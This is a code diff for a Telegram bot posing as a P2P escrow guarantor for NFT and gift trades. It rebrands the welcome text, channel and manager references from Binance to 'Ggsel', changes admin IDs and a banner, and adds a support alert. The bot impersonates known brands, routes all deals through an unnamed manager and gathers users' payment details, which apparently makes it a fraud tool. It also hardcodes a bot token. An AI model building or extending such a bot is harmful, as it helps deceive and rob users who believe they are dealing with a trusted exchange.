@@ -17,8 +17,8 @@ from aiogram.client.default import DefaultBotProperties
 
 # ===== НАСТРОЙКИ =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8923875062:AAHHU5XBuZLrg1dmLXLGEbMRxSxe-ap_uIk")
-INITIAL_ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8734750156,665396654,8734750156").split(",")]
-BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
+INITIAL_ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8734750156,665396654").split(",")]
+BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/gbXTDz0f/IMG-1254.jpg")
 PORT = int(os.getenv("PORT", 8080))
 DATA_FILE = "data.json"
 
@@ -90,13 +90,13 @@ def shield_emoji():
 
 def welcome_text():
     return (
-        f"{emoji('briefcase')} Добро пожаловать в Binance 🤝\n\n"
+        f"{emoji('briefcase')} Добро пожаловать в Ggsel 🤝\n\n"
         "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
         "1⃣ Автоматические сделки с NFT и подарками\n"
         f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
         f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
-        f"4⃣ {emoji('package')} Все сделки проходят через менеджера @binancesreport</blockquote>\n\n"
-        f"{emoji('lamp')} Наш канал ─ @binance_announcements"
+        f"4⃣ {emoji('package')} Все сделки проходят через менеджера</blockquote>\n\n"
+        f"{emoji('lamp')} Наш канал ─ @ggsel"
     )
 
 ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"
@@ -148,7 +148,7 @@ def main_menu(lang="ru"):
         "en": [f"{emoji('balance_icon')} Balance", "📋 My Deals", "🤝 New Deal",
                "📄 My Details", f"{emoji('people')} Referrals", "🌐 Language / Язык", "🆘 Support"]
     }[lang]
-    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
+    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang", "support"]
     kb = [
         [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
          InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
@@ -156,7 +156,7 @@ def main_menu(lang="ru"):
          InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
         [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
          InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
-        [InlineKeyboardButton(text=t[6], url="https://t.me/binancesreport")]
+        [InlineKeyboardButton(text=t[6], callback_data=callbacks[6])]
     ]
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
@@ -593,6 +593,11 @@ async def admin_list_admins(call: CallbackQuery):
     await call.message.answer(text)
     await call.answer()
 
+# ===== ТЕХПОДДЕРЖКА (без указания конкретного юзернейма) =====
+@dp.callback_query(F.data == "support")
+async def support_handler(call: CallbackQuery):
+    await call.answer("ℹ️ Обратитесь к менеджеру через наш канал @ggsel", show_alert=True)
+
 # ===== БАЛАНС =====
 @dp.callback_query(F.data == "balance_menu")
 async def balance_menu_handler(call: CallbackQuery):
@@ -668,12 +673,12 @@ async def new_deal_handler(call: CallbackQuery, state: FSMContext):
     txt = (
         "🤝 Создание P2P сделки\n\n"
         "Выберите свою роль в сделке:\n"
-        "• Продавец — вы получите оплату после подтверждения менеджером @binancesreport.\n"
+        "• Продавец — вы получите оплату после подтверждения менеджером.\n"
         "• Покупатель — вы получите товар после оплаты."
     ) if lang=="ru" else (
         "🤝 New P2P deal\n\n"
         "Choose your role:\n"
-        "• Seller — you'll receive payment after confirmation by manager @binancesreport.\n"
+        "• Seller — you'll receive payment after confirmation by manager.\n"
         "• Buyer — you'll receive the item after payment."
     )
     await delete_and_send_banner(call, txt, deal_role_choice(lang))
@@ -885,7 +890,7 @@ async def lang_cb(call: CallbackQuery):
     save_data()
     await return_to_main(call, new_lang)
 
-# ===== ВВОД РЕКВИЗИТОВ (общий обработчик) =====
+# ===== ВВОД РЕКВИЗИТОВ =====
 @dp.message()
 async def handle_rekv_input(message: Message):
     uid = str(message.from_user.id)
